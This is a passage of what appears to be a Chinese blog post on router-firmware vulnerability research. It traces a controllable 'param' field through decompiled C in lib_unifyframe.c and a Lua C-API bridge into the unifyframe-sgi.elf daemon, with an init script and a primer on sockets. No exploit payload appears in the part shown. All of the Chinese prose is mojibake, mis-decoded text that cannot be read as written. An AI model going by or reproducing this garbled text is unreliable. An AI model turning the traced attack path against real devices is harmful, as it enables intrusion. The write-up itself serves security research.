class="number">0</span>;</span><br><span class="line">LABEL_98:</span><br><span class="line">    *(_DWORD *)&amp;v53[v50] = <span class="number">0</span>;</span><br><span class="line">    ++v48;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ((*(<span class="type">int</span> *)v47 &gt;&gt; (v41 &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v52 = uf_socket_msg_read(v41, a2);</span><br><span class="line">    uf_socket_close(v41);</span><br><span class="line">    <span class="keyword">if</span> ( v52 &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v52;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)FD_ISSET failed[%s]&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>, <span class="number">710</span>, *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>));</span><br><span class="line">    uf_socket_close(v41);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶è¿™é‡Œæœ‰400è¡Œï¼Œä½†æ˜¯æˆ–è®¸æœ‰ä¸ªæ€è·¯ä¾¿æ˜¯ä»å¯æ§å­—æ®µå‡ºå‘åˆ†æ</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå…ˆå¤§è‡´åˆ†æä¸€ä¸‹æ¯ä¸ªå‚æ•°æ˜¯ä»€ä¹ˆï¼Œctype&#x3D;2ï¼Œcmd&#x3D;â€™setâ€™ï¼Œmodule&#x3D;â€networkId_mergeâ€ï¼Œparam&#x3D;å¯æ§å­—æ®µï¼Œåªåˆ°backåé¢éƒ½æ˜¯null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(v4) + <span class="number">8</span>;</span><br><span class="line">  v9 = <span class="built_in">calloc</span>(v8, <span class="number">1</span>);</span><br><span class="line">  v10 = <span class="number">433</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  v11 = v9;</span><br><span class="line">  v12 = v8;</span><br><span class="line">  v13 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_22;</span><br></pre></td></tr></table></figure><p>å› æ­¤v13&#x3D;â€devSta.setâ€ï¼Œä¹‹ågoto LABEL_22</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LABEL_22:</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">snprintf</span>(calloc_ptr, len2, method, v7) &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(calloc_ptr_1);</span><br><span class="line">LABEL_24:</span><br><span class="line">        json_object_put(method_1);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)method snprintf failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      devSta_string = json_object_new_string(calloc_ptr_1);</span><br><span class="line">      <span class="built_in">free</span>(calloc_ptr_1);</span><br><span class="line">      <span class="keyword">if</span> ( !devSta_string )</span><br><span class="line">      &#123;</span><br><span class="line">        json_object_put(method_1);</span><br><span class="line">        syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_method failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(method_1, <span class="string">&quot;method&quot;</span>, devSta_string);</span><br></pre></td></tr></table></figure><p>methodå­—æ®µèµ‹ä¸ºâ€™devSta.setâ€™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v20 = json_object_new_object();</span><br><span class="line"><span class="keyword">if</span> ( !v20 )</span><br><span class="line">&#123;</span><br><span class="line">  json_object_put(method_1);</span><br><span class="line">  syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_param failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">v21 = json_object_new_string(*(_DWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line"><span class="keyword">if</span> ( !v21 )</span><br><span class="line">&#123;</span><br><span class="line">  json_object_put(v20);</span><br><span class="line">  json_object_put(method_1);</span><br><span class="line">  syslog(<span class="number">3</span>, <span class="string">&quot;(%s %s %d)new obj_module failed&quot;</span>, <span class="string">&quot;lib_unifyframe.c&quot;</span>, <span class="string">&quot;uf_client_call&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">json_object_object_add(v20, <span class="string">&quot;module&quot;</span>, v21);</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°è¿™ä¸ªå°†a1å½“ä½œåœ°å€ï¼Œç„¶åé€šè¿‡è¿™ä¸ªæ¥èµ‹å€¼ï¼Œé—®é¢˜å°±å‡ºç°äº†ï¼Œä¸Šç½‘æŸ¥äº†ä¸€ä¸‹åŠ ä¸Šè‡ªå·±çš„çŒœæµ‹å†™ä¸‹ä»¥ä¸‹çš„ç†è§£</p><blockquote><p>åœ¨luaæ–‡ä»¶ä¸­è°ƒç”¨ä¸€ä¸ªCåº“çš„å‡½æ•°ï¼Œé¦–å…ˆluaå®ƒçš„æ¯ä¸€ä¸ªåç¨‹éƒ½æœ‰è‡ªå·±çš„æ ˆï¼Œç§°å…¶ä¸ºè½¯æ ˆï¼Œä¹‹åä¸¾ä¸ªä¾‹å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lua.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lauxlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lualib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…±äº«åº“ä¸­çš„å‡½æ•°å®ç°</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_function</span><span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">    <span class="comment">// è·å–å‚æ•°</span></span><br><span class="line">    <span class="type">int</span> arg1 = luaL_checkinteger(L, <span class="number">1</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *arg2 = luaL_checkstring(L, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰“å°å‚æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arg1: %d, arg2: %s\n&quot;</span>, arg1, arg2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›ç»“æœ</span></span><br><span class="line">    lua_pushstring(L, <span class="string">&quot;result from C function&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// è¿”å›ä¸€ä¸ªç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨å†Œå‡½æ•°</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">luaL_Reg</span> <span class="title">mylib</span>[] =</span> &#123;</span><br><span class="line">    &#123;<span class="string">&quot;my_function&quot;</span>, my_function&#125;,</span><br><span class="line">    &#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å¼€åº“</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">luaopen_mylib</span><span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">    luaL_newlib(L, mylib);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°å®ƒä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒåŒæ—¶åªæœ‰ä¸€ä¸ªæŒ‡é’ˆï¼Œç„¶åä¹‹åä¼šè¿›è¡Œæ³¨å†Œå‡½æ•°ï¼Œä¸¤ä¸ªNULLæ˜¯å“¨å…µï¼Œè€Œå‚æ•°çš„è°ƒç”¨æ˜¯ç”¨äº†luaL_checkintegerå’ŒluaL_checkstringå‡½æ•°ï¼ŒLæ˜¯ä¸€ä¸ªæŒ‡å‘å«æœ‰æ‰€æœ‰å‚æ•°çš„å†…å®¹çš„æŒ‡é’ˆï¼ŒçŒœæµ‹Læ˜¯æŒ‡å‘è½¯æ ˆï¼Œå³luaæ ˆä¸Šçš„å†…å®¹ï¼Œæˆ–è€…æ˜¯Cä¼šå°†è½¯æ ˆä¸Šçš„å†…å®¹copyåˆ°Cçš„æŸå—å†…å­˜é‡Œå¹¶å†™ä¸‹ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å®ƒï¼Œåªèƒ½è¯´å½¢å¼ä¸ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯æ•ˆæœæ˜¯ä¸€å®šçš„</p></blockquote><p>ä¹‹åçš„åˆ†æå°±ä¸ä¼šç‰¹åˆ«éš¾ï¼Œä¸»è¦æ˜¯çœ‹æ¸…ifæ¡ä»¶æ»¡ä¸æ»¡è¶³ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯å¯ä»¥ä¸ç”¨åˆ†æçš„</p><p>ä¹‹åä¾¿åˆ†æå‡ºä¼šå‘é€å½¢å¦‚<code>&#123;&quot;method&quot;:&quot;devSta.set&quot;, &quot;params&quot;:&#123;&quot;module&quot;:&quot;networkId_merge&quot;, &quot;async&quot;:true, &quot;data&quot;:&quot;xxx&quot;&#125;&#125;</code></p><p>è¡¥å……ä¸€ä¸‹åŸºç¡€çš„åªæ˜¯ what is socketï¼Ÿ</p><blockquote><p>Socketï¼ˆå¥—æ¥å­—ï¼‰æ˜¯ç½‘ç»œç¼–ç¨‹ä¸­ç”¨äºæè¿°è®¡ç®—æœºä¹‹é—´é€šä¿¡çš„ç«¯ç‚¹ã€‚å®ƒæä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ç½‘ç»œä¼ è¾“æ•°æ®ã€‚Socket æ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ä¸€ç§ç¼–ç¨‹æ¥å£ï¼Œç”¨äºç½‘ç»œé€šä¿¡ã€‚å®ƒå¯ä»¥åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šçš„ä¸åŒè¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒè®¡ç®—æœºä¹‹é—´é€šä¿¡ã€‚</p><h3 id="Socket-çš„ç±»å‹"><a href="#Socket-çš„ç±»å‹" class="headerlink" title="Socket çš„ç±»å‹"></a>Socket çš„ç±»å‹</h3><ol><li><strong>æµå¼å¥—æ¥å­—ï¼ˆStream Socketï¼ŒSOCK_STREAMï¼‰</strong>ï¼š<ul><li>ä½¿ç”¨ TCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰è¿›è¡Œé€šä¿¡ã€‚</li><li>æä¾›å¯é çš„ã€é¢å‘è¿æ¥çš„å­—èŠ‚æµæœåŠ¡ã€‚</li><li>é€‚ç”¨äºéœ€è¦ä¿è¯æ•°æ®ä¼ è¾“é¡ºåºå’Œå®Œæ•´æ€§çš„åº”ç”¨ï¼Œä¾‹å¦‚ HTTPã€FTP ç­‰ã€‚</li></ul></li><li><strong>æ•°æ®æŠ¥å¥—æ¥å­—ï¼ˆDatagram Socketï¼ŒSOCK_DGRAMï¼‰</strong>ï¼š<ul><li>ä½¿ç”¨ UDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰è¿›è¡Œé€šä¿¡ã€‚</li><li>æä¾›ä¸å¯é çš„ã€æ— è¿æ¥çš„æ¶ˆæ¯ä¼ é€’æœåŠ¡ã€‚</li><li>é€‚ç”¨äºå¯¹å®æ—¶æ€§è¦æ±‚è¾ƒé«˜ã€ä½†å¯¹æ•°æ®ä¼ è¾“å¯é æ€§è¦æ±‚è¾ƒä½çš„åº”ç”¨ï¼Œä¾‹å¦‚ DNS æŸ¥è¯¢ã€è§†é¢‘æµç­‰ã€‚</li></ul></li></ol></blockquote><p>åˆ†æ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uf_socket_msg_write(v41, v40, v46);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªuf_socket_msg_writeï¼Œè€Œwinmtå¸ˆå‚…çŒœæµ‹å› ä¸ºè¿™é‡Œæœ‰writeï¼Œv41æ˜¯socketçš„æ ‡è¯†ç¬¦ï¼Œv40åˆæŒ‡å‘çš„æ˜¯æˆ‘ä»¬å¯æ§å­—æ®µçš„æŒ‡é’ˆï¼Œå› æ­¤è¿™é‡Œä¸€å®šåœ¨è¿›ç¨‹æœ‰ä¸€ä¸ªuf_socket_msg_readä¸å®ƒäº’ç›¸æ¥æ”¶ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037164.png" alt="image-20240527202423205"></p><p>å†é€šè¿‡&#x2F;etc&#x2F;init.d&#x2F;ä¸­ä¹Ÿæœ‰ä¸€ä¸ªunifyframe-sgi.elfçš„åˆå§‹åŒ–æ–‡ä»¶</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh /etc/rc.common</span></span><br><span class="line"></span><br><span class="line">START=19</span><br><span class="line">STOP=99             <span class="comment">#ä¼˜å…ˆçº§</span></span><br><span class="line"></span><br><span class="line">PROG=/usr/sbin/unifyframe-sgi.elf</span><br><span class="line">PROG_1=/usr/sbin/uf_ubus_call.elf</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$IPKG_INSTROOT</span>/lib/functions/procd.sh&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    USE_PROCD=1</span><br><span class="line">    <span class="function"><span class="title">start_service</span></span>() &#123;</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_server.sock*</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_client.sock*</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        procd_open_instance</span><br><span class="line">        procd_set_param <span class="built_in">command</span> <span class="variable">$PROG</span></span><br><span class="line">        procd_set_param respawn</span><br><span class="line">        procd_close_instance</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        procd_open_instance</span><br><span class="line">        procd_set_param <span class="built_in">command</span> <span class="variable">$PROG_1</span></span><br><span class="line">        procd_set_param respawn</span><br><span class="line">        procd_close_instance</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">reload_service</span></span>() &#123;</span><br><span class="line">        restart <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    SERVICE_DAEMONIZE=1</span><br><span class="line">    <span class="function"><span class="title">start</span></span>() &#123;</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_server.sock*</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_client.sock*</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        service_start <span class="variable">$PROG</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        service_start <span class="variable">$PROG_1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">stop</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Stop <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        service_stop <span class="variable">$PROG</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Stop <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        service_stop <span class="variable">$PROG_1</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› æ­¤å°±æ­¤å¯ä»¥ç¡®è®¤unifyframe-sgi.elfæ–‡ä»¶å°±æ˜¯ä¸æœ¬æ–‡ä»¶çš„writeè¿›è¡Œäº¤æµçš„æ–‡ä»¶ï¼Œå› æ­¤ç€é‡åˆ†æä¸€ä¸‹unifyframe-sgi.elfæ–‡ä»¶</p><p>ä»mainå‡½æ•°åˆ†æèµ·</p><h3 id="unifyframe-sgi-elf"><a href="#unifyframe-sgi-elf" class="headerlink" title="unifyframe-sgi.elf"></a>unifyframe-sgi.elf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> 